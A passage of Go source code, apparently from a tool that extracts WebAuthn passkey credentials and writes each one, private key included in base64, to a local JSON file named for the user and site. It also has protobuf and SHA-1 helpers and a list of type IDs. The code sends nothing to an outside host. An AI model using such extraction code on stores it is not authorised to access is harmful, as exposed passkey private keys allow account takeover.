		entry.CreationTimeUTC = time.UnixMilli(w.CreationTime).UTC().Format(time.RFC3339)
	}
	if len(w.PrivateKey) > 0 {
		entry.PrivateKey = base64.StdEncoding.EncodeToString(w.PrivateKey)
	}
	if len(w.Encrypted) > 0 {
		entry.Encrypted = base64.StdEncoding.EncodeToString(w.Encrypted)
		entry.EncryptedByteSize = len(w.Encrypted)
	}

	user := string(w.UserName)
	if strings.TrimSpace(user) == "" {
		user = base64.RawURLEncoding.EncodeToString(w.UserId)
	}
	filename := sanitizeFilePart(user) + "_" + sanitizeFilePart(string(w.RpId)) + ".json"

	var existing []WebauthnCredentialDump
	if prev, err := os.ReadFile(filename); err == nil {
		if err := json.Unmarshal(prev, &existing); err != nil {
			DebugPrint("could not parse existing " + filename + ": " + err.Error())
			existing = nil
		}
	}

	replaced := false
	for i := range existing {
		if existing[i].CredentialID == entry.CredentialID {
			existing[i] = entry
			replaced = true
			break
		}
	}
	if !replaced {
		existing = append(existing, entry)
	}

	out, err := json.MarshalIndent(existing, "", "  ")
	if err != nil {
		return "", err
	}
	if err := os.WriteFile(filename, append(out, '\n'), 0600); err != nil {
		return "", err
	}
	return filename, nil
}

func getField1(data []byte) uint64 {
	if len(data) > 0 {
		key, n := protowire.ConsumeVarint(data)
		if n < 0 {
			return 0
		}
		fieldNum := key >> 3
		return fieldNum
	}
	return 0
}


func GetSHA1(data []byte) string {

	sum := sha1.Sum(data)

	return base64.StdEncoding.EncodeToString(sum[:])
}

var AllEnabledTypeIds = []uint64{
	32904,
	37702,
	45873,
	63951,
	31729,
	48119,
	50119,
	96159,
	150251,
	154522,
	556014,
	601980,
	673225,
	963985,
	1004874,
	895275,
	650913,
	956368,
	1308713,
	1125685,
	1902948,
	47745,
}
